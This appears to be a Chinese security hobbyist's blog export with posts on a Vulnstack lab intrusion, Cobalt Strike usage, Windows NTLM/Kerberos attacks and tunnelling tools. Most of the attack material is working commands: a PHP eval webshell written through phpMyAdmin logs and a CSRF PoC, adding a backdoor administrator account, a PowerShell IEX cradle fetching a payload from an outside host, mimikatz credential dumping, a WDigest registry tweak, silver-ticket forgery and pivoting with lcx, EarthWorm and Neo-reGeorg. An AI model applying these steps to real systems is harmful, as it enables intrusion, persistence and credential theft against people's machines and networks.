{"meta":{"title":"$_Fuck","subtitle":"白天搞笑的废物，晚上抑郁的怪物。","description":"无助就算了，还要假装坚强。","author":"$_Fuck","url":"http://yoursite.com","root":"/"},"pages":[{"title":"关于","date":"2019-12-16T09:22:41.000Z","updated":"2020-01-31T19:19:57.440Z","comments":true,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":"擅长Web安全 PHP开发、审计 Python脚本开发最近在学内网渗透，期间笔记也会记录下来，希望自己越来越好。关于本站：分享一些自己成长经验以及实战中的案例，若违必删。自己觉得好看的书，文艺的句子也会记录下来。 联系方式微信号: refuel_iamfreeQQ ：由于手机卡丢失，开启了手机验证码验证，然后一直无法登陆（卡是很久前同学送我的），最他妈气的是游戏可以上被好友坑了不能聊天喷他。 关于本人接触这行已经2年了，所得成就寥寥无几，所以希望重开博客来记录下成长。 滴滴SRC 2018年度TOP10漏洞盒子 2018年总排行150+BILIBILI SRC 2018年度TOP 2百度SRC 某月第四，总排行45名… … 生活状态无事别八卦"},{"title":"友情链接","date":"2020-01-31T19:22:35.000Z","updated":"2020-01-31T21:28:00.106Z","comments":true,"path":"link/index.html","permalink":"http://yoursite.com/link/index.html","excerpt":"","text":"不管你挂不挂我，你文章好我就挂你。 内网AnonySec师傅：https://payloads.cn/"},{"title":"categories","date":"2019-12-17T19:25:07.000Z","updated":"2019-12-17T19:25:07.352Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2019-12-17T19:15:28.000Z","updated":"2019-12-17T19:24:37.042Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":"window.location.href='Web安全/';"}],"posts":[{"title":"Vlunstack ATT&CK实战系列一","slug":"ATT","date":"2020-02-02T04:56:56.000Z","updated":"2020-02-02T04:58:57.178Z","comments":true,"path":"2020/02/02/ATT/","link":"","permalink":"http://yoursite.com/2020/02/02/ATT/","excerpt":"","text":"这几十G下的我有点蒙… 不得不感慨有一部好电脑对学安全的人是有多幸福了。。 环境下载 http://vulnstack.qiyuanxuetang.net/vuln/detail/2/ 网络环境 1Windows 7有双网卡，也就是内外网IP2外网IP：192.168.31.1293内网IP：192.168.52.1434且此服务器存在yxcms56Windows 2008只有内网网卡7内网IP： 192.168.52.13889Win2k3只有内网网卡10内网IP：192.168.52.141 很明显，要想访问Windows 2008和Win2k3服务器必须要拿下Windows 7服务器，用它做跳板进内网进行横向渗透。 攻击过程0x1.获取WEBSHELL目标URL：http://192.168.31.129/yxcms/ 得知是yxcms，直接百度一把搜，找到如下文章 https://bbs.ichunqiu.com/thread-45926-1-1.html 这里都是需要后台才可以getshell的，自己审计不太现实，故打开默认后台试试弱口令 http://192.168.31.129/yxcms/index.php?r=admin/index/login 将登录的数据包放入Repeater重放多次发现验证码没有自动刷新，故可以爆破，然后填了密码字典后放着等他跑，看看其他的点是否有漏洞~ 这里爆破出了phpMyAdmin，然后打开试试弱口令root/root直接就进去了 phpMyAdmin GetShell 1set global general_log&#x3D;on; # 开启日志2set global general_log_file&#x3D;&#39;C:&#x2F;phpstudy&#x2F;www&#x2F;fuck.php&#39;; # 设置日志位置为php代码，然后保存的日志内容写上shell就可以了3select &#39;&lt;?php eval($_POST[&quot;fuck&quot;]); ?&gt;&#39; # 这段查询会带入到日志中，然后就成功变成WebShell了 然后使用蚁剑连接 然后yxcms后台这边burp也跑出密码来了 账户密码为：admin/123456，进入后台，直接上高速打POC 1&lt;html&gt;2 &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;3 &lt;body&gt;4 &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;5 &lt;form action=\"http://192.168.31.129/yxcms/index.php?r=admin/set/tpadd&amp;Mname=default\" method=\"POST\"&gt;6 &lt;input type=\"hidden\" name=\"filename\" value=\"fuck\" /&gt;7 &lt;input type=\"hidden\" name=\"code\" value=\"&amp;lt;&amp;#63;php&amp;#32;eval&amp;#40;&amp;#36;&amp;#95;POST&amp;#91;&amp;quot;fuck&amp;quot;&amp;#93;&amp;#41;&amp;#59;&amp;#63;&amp;gt;\" /&gt;8 &lt;input type=\"submit\" value=\"Submit request\" /&gt;9 &lt;/form&gt;10 &lt;/body&gt;11&lt;/html&gt; 打开如上html页面就会在生成一个WebShell在http://192.168.31.129/yxcms/protected/apps/default/view/default/fuck.php页面，密码为fuck 0x2.内网渗透首先查看是什么权限，是否有域 管理员权限，且有域~ 然后一般拿下window的话我都会选择去连接它的远程桌面（PORT:3389） 输入netstat -ano | find &quot;3389&quot;没有回显，证明未开启远程桌面服务，用如下命令开启 1REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 成功开启。 然后开启了3389后可以选择读管理员的明文密码或添加用户，前者可能因为读不出明文密码（03前的操作系统使用LM HASH加密明文，可逆，越后的系统都使用新的加密NTLM HASH），所以这里选择后者添加密码 1C:\\phpStudy\\WWW&gt; net user test @!FuckSEC!@ &#x2F;add # 添加账户密码2命令成功完成。3 4C:\\phpStudy\\WWW&gt; net localgroup administrators test &#x2F;add # 给test账户添加为管理员权限5命令成功完成。67C:\\phpStudy\\WWW&gt; net user test # 查询是否成功添加test用户8用户名 test9全名 10注释 11用户的注释 12国家&#x2F;地区代码 000 (系统默认值)13帐户启用 Yes14帐户到期 从不15上次设置密码 2020&#x2F;2&#x2F;1 10:27:5216密码到期 2020&#x2F;3&#x2F;14 10:27:5217密码可更改 2020&#x2F;2&#x2F;2 10:27:5218需要密码 Yes19用户可以更改密码 Yes20允许的工作站 All21登录脚本 22用户配置文件 23主目录 24上次登录 从不25可允许的登录小时数 All26本地组成员 *Administrators *Users 27全局组成员 *None 28命令成功完成。 然后使用账号密码test/@!FuckSEC!@登录远程桌面 哦吼！fuck 一开始猜测可能是防火墙禁止3389端口进出网，然后经过端口转发后才发现并不是，如图 防火墙开启了阻止所有与未在允许程序列表中的程序的连接，换句话说，设置了白名单，只能本地连接，那么我们使用ngrok的frp创建一个TCP隧道 1、首先在http://ngrok.cc/user.html注册用户，然后开通FRP服务器 2、下载frp客户端工具 将工具上传至目标服务器，然后执行如下命令 1sunny.exe --clientid=隧道id 3、然后连接xxxx.xxxx.xxx:10062 内网已进入，然后我习惯性直接上去关防火墙，然后用cs上线 这个线上的很心塞。。 生成了好多shell然后过了好一会才过来。 0x3.信息收集1、使用ipconfig /all看网络环境（查询是否有域） 2、net config Workstation查询当前计算机名、计算机全名、用户名、工作站、软件版本、工作站域、工作站域 DNS 名称、登录域 这样也能看 3、查看进程tasklist /v 有些进程可能是域用户启的­&gt;通过管理员权限 凭证窃取 ­&gt; 窃取域用户的凭证 4、显示正由指定的计算机共享的域、计算机或资源的列表。如果在没有参数的情况下使用，则net view显示当前域中的计算机列表。 这里OWA主机是主域控制器，IP为192.168.52.138，然后还有一个主机名为ROOT-TVI862UBEH，IP为192.168.52.141（环境3） 而本机不是域机器所以跑不出域相关信息，着重于横向渗透。 目前知道的数据就行了，然后在本地抓一下管理员密码（Cs跑内存HASH、注册表HASH） 0x4.密码获取1、直接用cs的hashdump读内存密码。 2、用mimikatz读注册表密码 1beacon&gt; logonpasswords2读出的信息... 我们可以直接在Credentials模块下看的清清楚楚 这里直接抓取了Administrator的明文密码hongrisec@2019 0x5.横向渗透在靶场上作者给出了四点 所以这里要使用到msf，但是Win2k3和Window 2008都是内网主机，我们攻击机的msf无法访问，所以我们要在Window 7上开启一个隧道，将msf带入内网。 开通隧道带msf进内网1、在cs上开通socks通道 1socks 9999 2、在攻击机上设置proxychains 1vi &#x2F;etc&#x2F;proxychains.conf2socks4 127.0.0.1 9999 小白肯定会问为什么这里设置的代理是127.0.0.1 9999，因为我cs的服务端是kali，然后在cs执行socks 9999相当于在我kali上开通一个9999的socks代理，然后我kali直接连本地的9999端口就可以了 3、使用代理打开msf 1proxychains msfconsole 这样msf就成功进内网啦 然后这里尝试去跑一下MS08-067 先不搞了妈的，老子心态炸了，重启了电脑后win7就不能出网了…","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"内网渗透重头戏之Cobaltstrike用法","slug":"内网渗透重头戏之Cobaltstrike用法","date":"2020-01-30T14:06:47.000Z","updated":"2020-01-31T18:42:28.400Z","comments":true,"path":"2020/01/30/内网渗透重头戏之Cobaltstrike用法/","link":"","permalink":"http://yoursite.com/2020/01/30/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%87%8D%E5%A4%B4%E6%88%8F%E4%B9%8BCobaltstrike%E7%94%A8%E6%B3%95/","excerpt":"","text":"将Cobaltstrike称为，Cs 文件结构1│ agscript 拓展应用的脚本2│ c2lint 检查profile的错误异常3│ cobaltstrike4│ cobaltstrike.jar 客户端程序5│ icon.jpg6│ license.pdf7│ readme.txt8│ releasenotes.txt9│ teamserver 服务端程序10│ update11│ update.jar12│13└─third-party 第三方工具14 README.vncdll.txt15 vncdll.x64.dll16 vncdll.x86.dll 打开Cs分为客户端和服务端 服务端(teamserver)开放Cs服务给客户端(cobaltstrike.exe)连接 1赋予执行权限：2chmod 777 teamserver3然后在服务端执行4.&#x2F;teamserver IP 密码 然后host填上面的IP密码也是填一样的。 功能介绍1New Connection 新的链接2Preferences 偏好设置3Visualization 窗口视图模式4VPN interfaces VPN接入5Listeners 监听器6Sript Manager 脚本管理7Close 退出89View：10Applications 用于显示 System Profiler 获取的目标浏览器，操作系统，flash版本11Credentials 显示所有已经获取的用户主机hash12Downloads 显示下载的文件13Event log 事件日志 记录团队 目标上线等记录14Keystrokes 目标键盘记录15Proxy Pivots 代理信息16Screenshots 屏幕截图17Script Console 加载自定义脚本18Targets 显示所有主机19Web log web服务日志2021Attack：22Packages23HTML Application 生成hta文件24MS Office Macro 宏office文件25Payload Generator 生成各种语言版本的payload26USB&#x2F;CD AutoPlay 利用自动播放运行的被控端文件27Windows Dropper 捆绑器可将任意正常的文件28Windows Executable payload生成可执行文件 (一般使用这个)29Windows Executable (S) 把包含payload,Stageless生成可执行文件(包含多数功能)3031Web Drive-by：32Manage 开启的所有web服务33Clone Site 克隆网站 34Host File 提供Web以供下载某文件35Scripted Web Delivery 为payload提供web服务以便于下载和执行36Signed Applet Attack 启动一个Web服务以提供自签名Java Applet的运行环境37Smart Applet Attack 自动检测Java版本并l利用已知的exploits绕过security38System Profiler 获取系统，Flash，浏览器版本等3940Reporting：41Activity report 活动报告42Hosts report 主机报告43Indicators of Compromise 威胁报告44Sessions report 会话报告45Social engineering report 社会工程学报告4647右键功能：48Interact 打开beacon49Access 50 dump hashes 获取hash51 Elevate 提权52 Golden Ticket 生成黄金票据注入当前会话53 MAke token 凭证转换54 Run Mimikatz 运行 Mimikatz 55 Spawn As 用其他用户生成Cobalt Strike侦听器56Explore57 Browser Pivot 劫持目标浏览器进程58 Desktop(VNC) 桌面交互59 File Browser 文件浏览器60 Net View 命令Net View61 Port scan 端口扫描62 Process list 进程列表63 Screenshot 截图64Pivoting65 SOCKS Server 代理服务66 Listener 反向端口转发67 Deploy VPN 部署VPN68Spawn 新的通讯模式并生成会话69Session 会话管理，删除，心跳时间，退出，备注 用法使用命令行上线（反弹shell） 点开后界面如下，然后一些监听操作都是界面化的不需要自己去构造命令如何执行。 图里的Listener里的是监听端口和监听IP，然后会生成一个powershell代码，命令如下 1powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;47.xxx.xxx.xxx:80&#x2F;a&#39;))&quot;23这个称为上线一句话 其实就是把监听的命令写在了http://47.xxx.xxx.xxx/a里，然后用powershell远程执行。 然后比如我们拿下了webshell或者可以执行系统命令，就可以直接甩Cs生成的命令，然后执行成功为下图 如果目标系统执行不了powershell可以使用其他的，Cs自带有四个 文件浏览 取密码 有很多系统不能直接取明文密码，可以修改注册表选项reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f然后重启就行了（可以修改后，等目标机器重启然后直接读明文密码） 内存密码直接跑mimikatz取内存密码 注册表密码dumphash取内存密码 代理进内网 为什么要使用代理？ 如内网用很多功能用图形化展示比较方便，如mysql等，那么我们可以在目标内网开通一个渠道，供我们去连接然后可以去使用图形化工具 目标内网192.168.31.140，我的服务端192.168.31.138，假设不在同一个内网，我服务端是VPS，目标IP是内网，那么我可以通过Cs在服务端开一个端口代理，这个代理是走目标内网流量的，所以我代理服务端端口就等于我用目标内网的流量。 然后我们可以点击View -&gt; Proxy Pivots来看代理记录 然后代理服务端的IP的55423端口 扩展插件 这里使用k8哥哥开发的内网渗透扫描器Ladon项目地址：https://github.com/k8gege/Ladon 下载之后，点击Cobalt Strike -&gt; Script Manager 然后把Ladon的Ladon.cna导入进去，如图 直接在命令行输入Ladon help可以看帮助 用法： 1Ladon 192.168.11.0&#x2F;24 OnlinePC # IP存活扫描 2Ladon 192.168.11.0&#x2F;24 PortScan # 端口扫描 3Ladon 192.168.11.0&#x2F;24 webScan # web扫描 4Ladon 192.168.11.0&#x2F;24 MS17010 # 17010扫描s hash传递还未学到此知识点，等学到了更新","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"},{"name":"好文","slug":"兴趣爱好/好文","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/%E5%A5%BD%E6%96%87/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"Window认证认证介绍","slug":"Window认证认证介绍","date":"2020-01-26T17:01:27.000Z","updated":"2020-01-31T18:42:23.047Z","comments":true,"path":"2020/01/27/Window认证认证介绍/","link":"","permalink":"http://yoursite.com/2020/01/27/Window%E8%AE%A4%E8%AF%81%E8%AE%A4%E8%AF%81%E4%BB%8B%E7%BB%8D/","excerpt":"","text":"在了解内网渗透前，是很有必要去学习这些的。 Window密码存储地址 1%SystemRoot%\\system32\\config\\sam Window密码存储过程 用户输入密码 程序将密码进行NTLM算法加密为HASH值存储在SAM文件，并保存在本地SAM数据库 可以看看NTLM HASH值是怎么样的 1fuck NTLM加密后 8592e1331718673b0ee32df3c0153456 NTLM HASH的前者是LM HASH，简单来说就是LM算法比NTLM算法垃圾，然后被淘汰，所以比较新的操作系统的密码不容易被读取出来，而03、xp系统就是使用LM HASH所以我们可以直接内网渗透的时候读取到原文密码而不用去跑HASH。 Window登录过程当我们登录window系统的时候，系统会读取SAM文件中的密码与我们输入的密码进行验证，如果正确则成功登录。在SAM文件中，我们的密码是NTLM HASH加密的，这样子在一定的情况下保障了密码的安全。 更详细的就是 用户开机输入密码 -&gt; 系统会调用winlogon.exe接受用户输入的密码 -&gt; 在lsass.exe进程将明文密码转换成NTLM HASH然后读取SAM数据库与用户名，如果正确将User SID和Group SID传到winlogon.exe准备登录，如果失败则提示密码错误 LSASS用于本地安全和登录策略 Window网络认证 工作组概念（需要了解）： 工作组(Work Group)是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。比如在一个网络内，可能有成百上千台工作电脑，如果这些电脑不进行分组，都列在“网上邻居”内，可想而知会有多么乱(恐怕网络邻居也会显示“下一页”吧)。为了解决这一问题，Windows 9x/NT/2000 才引用了“工作组”这个概念，比如一所高校，会分为诸如数学系、中文系之类的，然后数学系的电脑全都列入数学系的工作组中，中文系的电脑全部都列入到中文系的工作组中……如果你要访问某个系别的资源，就在“网上邻居”里找到那个系的工作组名，双击就可以看到那个系别的电脑了。 假设A主机与B主机同在一个工作组，A想登录B，那么A需要知道B的账号密码，且B需要开启SMB服务（PORT:445）。 SMB服务主要用于文件共享 NTLM协议 早期SMB协议在网络上是明文传输的，后来出现了LM验证机制，但是他很简单所以可以被破解为明文，所以又推出了NTLM NTLM是一种网络认证协议，它基于挑战（Chalenge）和响应（Response）机制的协议，只支持Window系统 挑战（Chalenge）和响应（Response）NTLM认证分三步：协商、质询、验证 协商：用于确认双方协议版本（用于兼容各版本）质询：客户端向服务端发送用户信息请求，服务端接受请求生成一个16位随机数(Challenge)，使用用户名对应的NTLM HASH加密Challenge然后生成为Challenge1，然后发送给客户端，客户端接收到Challenge后将要登录的账户对应的NTLM HASH加密Challenge生成Respone并发送给服务端，服务端接受到客户端的Respone后，对比Challenge和Challenge是否相同，如果相同就认证成功 1Challen1 &#x3D; NTLM HASH(Challenge) &#x3D; Net NTLM Hash 验证：质询完成后验证结果 NTLM v2协议NTLM v1生成的随机数是8位、NTLM v2的有16位。 v1的加密算法是DES、v2的算法是HMAC-MD5 Pass The Hash（哈希传递）在内网横向渗透中，攻击人员经常会抓取管理员的密码和NTLM HASH来进行横向渗透 哈希传递指不需要账户明文密码的情况下完成认证，使攻击人员在渗透中获取不到明文也可以进行登录。 哈希传递的要求1、需要能访问目标服务器2、需要传递被认证的用户名3、需要传递被认证用户的NTLM HASH 相当于web端的xss获取到的cookie，而不需要账户密码进行认证。 哈希传递原理将用户名对应的NTLM HASH加密服务器给出的Chanllenge，生成一个Response给服务器来完成认证。 Kerberos域认证活动目录（Active Directory）概念Active Directory存储了有关网络对象的信息，让管理员和用户可以查找和使用执行信息 网络对象：存储用户、用户组、计算机、域、组织单位以及安全策略… 在一个机器上装上活动目录后，这个机器就是一个域控服务器 Kerberos认证协议和NTLM一样都是认证协议，当他比NTLM安全 Kerberos的设计目标是通过密钥系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享密钥）执行认证服务的。 简要大概地说一下Kerberos是如何工作的： 假设你要在一台电脑上访问另一个服务器（你可以发送telnet或类似的登录请求）。你知道服务器要接受你的请求必须要有一张Kerberos的“入场券”。 要得到这张入场券，你首先要向验证服务器（AS）请求验证。验证服务器会创建基于你的密码（从你的用户名而来）的一个“会话密钥”（就是一个加密密钥），并产生一个代表请求的服务的随机值。这个会话密钥就是“允许入场的入场券”。 然后，你把这张允许入场的入场券发到授权服务器（TGS）。TGS物理上可以和验证服务器是同一个服务器，只不过它现在执行的是另一个服务。TGS返回一张可以发送给请求服务的服务器的票据。 服务器或者拒绝这张票据，或者接受这张票据并执行服务。 因为你从TGS收到的这张票据是打上时间戳的，所以它允许你在某个特定时期内（一般是八小时）不用再验证就可以使用同一张票来发出附加的请求。使这张票拥有一个有限的有效期使其以后不太可能被其他人使用。 或者如下的理解： 客户机将明文密码、时间戳（使用krbtgt密码hash作为密钥）进行NTLM哈希加密,发送给kdc（域控），kdc对用户进行检测，成功之后创建TGT(Ticket-Granting Ticket) 将TGT进行加密签名返回给客户机器，只有域用户krbtgt才能读取kerberos中TGT数据 然后客户机将TGT发送给域控制器KDC请求TGS（票证授权服务）票证，并且对TGT进行检测 检测成功之后，将目标服务账户的NTLM以及TGT进行加密，将加密后的结果返回给客户机。 白银票据(Silver Tickets) 特点：不需要与KDC交互需要目标服务器的NTLM HASH（有目标服务器的权限，但是不知道明文密码，就可以用NTLM HASH跳过服务器认证完成认证） Server Session Key在未发送Ticket之前，服务器是不知道Server Session Key是什么的。 所以，一切凭据都来源于Server Hash 伪造白银票据这里使用的是mimikatz.exe 1kerberos::list #列出票据2kerberos::purge #清除票据 导出Server Hash1mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; pj.txt 伪造票据1mimikatz &quot;kerberos::golden &#x2F;domain:&lt;域名&gt; &#x2F;sid:&lt;域 SID&gt; &#x2F;target:&lt;目标服务器主机名&gt; &#x2F;service:&lt;服务类型&gt; &#x2F;rc4:&lt;NTLM Hash&gt; &#x2F;user:&lt;用户名&gt; &#x2F;ptt&quot; exit 白银票据防御 保证服务器HASH不被获取 开启PAC（特权属性证书保护，规定服务器必须将票据发送给kerberos服务并验证票据是否有效）1开启方法：2将注册表中HKEY_LOCAL_MACHINE\\SYSTEM \\ CurrentControlSet\\Control\\Lsa\\Kerberos\\Parameters的ValidateKdcPacSignature设置为1 黄金票据(Golden Tickets) 特点： 需要与DC通信 需要krbtgt用户的HASH 1krbtgt HASH &#x3D; KDC HASH 暂未看透。待更新。","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"},{"name":"好文","slug":"兴趣爱好/好文","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/%E5%A5%BD%E6%96%87/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"内网穿透大合集","slug":"内网穿透大合集","date":"2020-01-24T05:31:13.000Z","updated":"2020-01-31T18:41:54.703Z","comments":true,"path":"2020/01/24/内网穿透大合集/","link":"","permalink":"http://yoursite.com/2020/01/24/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%A4%A7%E5%90%88%E9%9B%86/","excerpt":"","text":"内网穿透学习内网穿透涉及到2个概念 1、正向代理2、反向代理3、端口转发4、端口映射 正向代理 正向代理即是客户端代理，代理客户端，服务端不知道实际发起请求的客户端。 vpn就是很好的一个例子，因为我们国内的ip是无法访问google的，那么我们都需要设置一个代理服务器，也就是vpn，我们才可以访问到google，那么这个过程就是正向代理，过程解析如下。 反向代理 反向代理即是服务器端代理，代理服务器，客户端不知道实际提供服务的服务器。 比如nginx，客户端访问想要服务器的8080端口，可是服务器的8080端口不对外开发，这里通过nginx代理端口，将所有访问80端口的流量都转发到8080端口，这样客户端只需要访问80端口就相当于访问了服务器的8080端口。这里代理的是服务器 端口转发使用lcx进行端口转发简单来说就是，a机器我可以执行命令，但是我想连接他的3389，但是禁止外网连接，那么我们可以用lcx来把3389端口的流量，转发到我们机器的其他端口，比如5555端口，然后连接只要连接127.0.0.1:5555就可以连接a机器的3389了。 把lcx上传到目标服务器（比如我们可以把lcx.exe上传到www.xxx.com地址，然后lcx.exe就变成了www.xxx.com/lcx.exe，然后在目标机器上执行wget讲起下载到目标服务器） 然后执行如下命令 1本机：lcx.exe -listen 51 33891 注意：本机必须要外网服务器，就是别人可以访问你的ip2目标服务器:lcx.exe -slave 公网ip 51 目标服务器ip 3389 本机执行的命令意思为： 利用lcx.exe监听本地51端口，然后将其转发到33891端口 目标服务器执行的命令为： 利用lcx.exe去连接本机ip的51端口，并且将目标服务器的3389端口转发给他 攻击机： 受害机： 然后直接连接 攻击机的33891端口即可 使用abptts进行端口转发 这个工具是走HTTP隧道的 安装1git clone https:&#x2F;&#x2F;github.com&#x2F;nccgroup&#x2F;ABPTTS.git 2apt install python‐setuptools 3apt install python‐pip 4pip install ‐‐upgrade pip 5python ‐m pip install pycrypto 6python ‐m pip install pycryptodome 7python ‐m pip install httplib89cd ABPTTS 10python abpttsfactory.py ‐o webshell 用法1靶机 192.168.31.99 放置webshell 2攻击机 192.168.31.138 python abpttsclient.py -c webshell\\config.txt -u &quot;http:&#x2F;&#x2F;192.168.31.99&#x2F;abptts.aspx&quot; -f 127.0.0.1:2233&#x2F;192.168.31.99:223# 将靶机的22端口转发到本地的2233端口 这个工具只能asp和jsp环境所以没有利用环境，口头描述啦，可以自行去看相关文章 端口映射比如你拿下的内网机器禁止3389出网或者只能特定机器连接的时候，我们可以将3389端口转到其他端口。 1lcx.exe -tran 映射端口 连接IP（可以是127.0.0.1，但是连接的时候必须要是外网可以请求的ip） 连接端口 然后连接他的33899端口即连接他的3389端口了 跨平台网络穿透工具-EarthWorm 下载地址：http://rootkiter.com/EarthWorm/ 1ew参数23‐h 查看帮助4‐s 指定链路状态(ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、 lcx_tran)5 ssocksd：正向socks5代理连接;6 rcsocks、rssocks：反向socks5代理连接;7 lcx_slave、lcx_listen：端口转发;8 lcx_tran：端口映射;9‐l 开放指定端口监听;10‐d 指定转发或反弹的主机地址；11‐e 指定转发或反弹的主机端口；12‐f 指定连接或映射的主机地址；13‐g 指定连接或映射的主机端口；14‐t 设置超时时间，默认为10000毫秒，即10秒(单位毫秒，‐h显示有误)；15‐v 显示版本；16‐a 显示关于页面； 普通网络环境1目标边界有内外网IP，且可访问外网，但不能和我们服务器相同。 正向socks5此时的网络环境：目标网络边界存在公网IP且可任意开监听端口 比如某个服务是内网才可以连接的，然后在拿下的内网服务器开启他的1080端口的socket代理，然后使用本机代理就可以直接连接他内网服务 开启1080端口的socket代理 1ew -s ssocksd -l 1080 然后设置代理为连接IP:1080，window可以用shadowsocks，linux下修改/etc/proxychains.conf设置代理为目标网络，如图 那么这个时候，你请求什么，都等同于，开启了代理的服务器请求了的。 然后使用代理扫描目标服务器开放的端口 1proxychains nmap ip -Pn -A 反向socks5此时的网络环境：当目标网络边界(Client)不存在公网 IP，需要通过反弹方式创建socks代理，简单来说就是目标服务器是内网IP，但能访问外网。 1VPS服务器： ew -s rcsocks -l 1080 -e 555 # 将本机的555端口的流量都转发给1080端口，这里1080端口只是用于传输流量2目标服务器： ew -s rssocks -d VPS服务器IP -e 555 # 连接VPS服务器的555端口，表示开一个通道给他34然后在VPS服务器上配置proxychains代理链的配置文件，将代理设置成 127.0.0.1 的1080端口：socks5 127.0.0.1 1080 5然后命令前面加上 proxychains即可。如：proxychains curl 192.168.99.99 二级网络环境0x1此时的网络环境： 1服务器A：192.168.31.1332服务器B：192.168.31.138（内网IP），10.99.91.19（公网IP）34A是内部主机，无法访问公网。5B有双网卡，有内外网IP，且可以自由开监听端口。 我们有A、B权限，但是我们想访问A主机的内网服务的话可以这样操作 在A主机上开启监听端口为6666的socks代理 1ew -s ssocksd -l 6666 在B主机上将1080端口收到的socks代理请求转发给A主机的6666端口 1ew -s lcx_tran -l 1080 -f 192.168.31.133 -g 6666 简单来说就是A无法访问，然后我们通过可以访问A的B来做VPN服务器，就可以访问A了。 0x2此时的网络环境： 1服务器A：192.168.31.1332服务器B：192.168.31.1383VPS服务器：10.11.91.1945服务器A是目标内部主机，无法访问外网。6服务器B是目标边界主机，无公网IP，但能访问外网。78思路：在服务器A上走代理通过服务器B出去到VPS 在VPS上添加转接隧道，将1080收到的代理请求转交给反连6666端口的主机 1ew -s lcx_listen -l 1080 -e 6666 在A服务器上监听7777端口的的socks代理 1ew -s ssocksd -l 7777 在B服务器上开通A服务器和VPS之间的连接隧道 1ew -s lcx_slave -d 10.11.91.19 -e 6666 -f 192.168.31.133 -g 7777 然后连接VPS服务器的1080端口就可以访问服务器A了。 NeoreGeorg这是一个走HTTP流量的工具，所以需要上传脚本到WEB服务器然后连接 下载地址：https://github.com/L-codes/Neo-reGeorg 安装需要的库 1python -m pip install requires2python -m pip install chardet3python -m pip install certifi4python -m pip install idna5python -m pip install pysocks6python -m pip install requests 正向socks代理1目标边界： 192.168.31.99 放置WEBSHELL2攻击机： 192.168.31.138 python3 neoreg.py -k 123456 -u http:&#x2F;&#x2F;192.168.31.99&#x2F;tunnel.php Step1. 设置密码生成 tunnel.(aspx|ashx|jsp|jspx|php)并上传到目标边界的WEB服务器 1root@onlyfree:~&#x2F;Neo-reGeorg# python3 neoreg.py generate -k 123456234 &quot;$$$$$$&#39;&#39; &#39;M$ &#39;$$$@m5 :$$$$$$$$$$$$$$&#39;&#39;$$$$&#39;6 &#39;$&#39; &#39;JZI&#39;$$&amp; $$$$&#39;7 &#39;$$$ &#39;$$$$8 $$$$ J$$$$&#39;9 m$$$$ $$$$,10 $$$$@ &#39;$$$$_ Neo-reGeorg11 &#39;1t$$$$&#39; &#39;$$$$&lt;12 &#39;$$$$$$$$$$&#39; $$$$ version 1.1.013 &#39;@$$$$&#39; $$$$&#39;14 &#39;$$$$ &#39;$$$@15 &#39;z$$$$$$ @$$$16 r$$$ $$|17 &#39;$$v c$$18 &#39;$$v $$v$$$$$$$$$#19 $$x$$$$$$$$$twelve$$$@$&#39;20 @$$$@L &#39; &#39;&lt;@$$$$$$$$&#96;21 $$ &#39;$$$222324 [ Github ] https:&#x2F;&#x2F;github.com&#x2F;L-codes&#x2F;neoreg2526 [+] Mkdir a directory: neoreg_server27 [+] Create neoreg server files:28 &#x3D;&gt; neoreg_server&#x2F;tunnel.ashx29 &#x3D;&gt; neoreg_server&#x2F;tunnel.js30 &#x3D;&gt; neoreg_server&#x2F;tunnel.tomcat.5.jspx31 &#x3D;&gt; neoreg_server&#x2F;tunnel.php32 &#x3D;&gt; neoreg_server&#x2F;tunnel.jsp33 &#x3D;&gt; neoreg_server&#x2F;tunnel.tomcat.5.jsp34 &#x3D;&gt; neoreg_server&#x2F;tunnel.aspx35 &#x3D;&gt; neoreg_server&#x2F;tunnel.nosocket.php36 &#x3D;&gt; neoreg_server&#x2F;tunnel.jspx Step2. 然后会生成neoreg_server目录，里面放置的是tunnel Step3. 然后在目标WEB服务器的根目录放PHP脚本，这里如果目标是JAVA环境那么要上传JSP脚本，我这里测试环境搭建的是phpstudy所以用的PHP Step4. 在使用 neoreg.py 连接WEB服务器，在本地建立 socks 代理 1python3 neoreg.py -k password -u 放置tunnel的地址 然后代理192.168.31.138的1080端口就可以了 venom 